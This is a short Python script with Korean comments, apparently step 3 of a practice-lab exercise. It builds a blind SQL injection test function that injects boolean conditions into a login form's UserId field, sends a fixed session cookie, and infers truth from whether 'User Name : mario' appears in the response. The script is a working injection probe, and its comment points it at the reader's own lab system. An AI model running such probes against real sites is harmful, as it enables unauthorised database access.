# step 3. Blind SQLi 검증 함수
import urllib.request
import urllib.parse
import re

def blindSqli(query):
	# 본인 실습 시스템의 URL 경로를 입력하세요!
	url = ""

	param = "' and {} and '1'='1".format(query)

	data = {'UserId': 'mario'+param,'Password':'mariosuper','Submit':'Login'}
	data = urllib.parse.urlencode(data).encode()
	cookie = 'PHPSESSID=nn91fov2c3j46bbaa9mb88qdft;'
	req = urllib.request.Request(url, data=data)
	
	req.add_header('cookie',cookie)

	response = urllib.request.urlopen(req)
	res_text = response.read().decode()

	chk = re.findall('User Name : mario', res_text)
	if(chk):
		return True
	else:
		return False


true_query = "'1'='1'"
false_query = "'1'='2'"

print(blindSqli(true_query))
print(blindSqli(false_query))
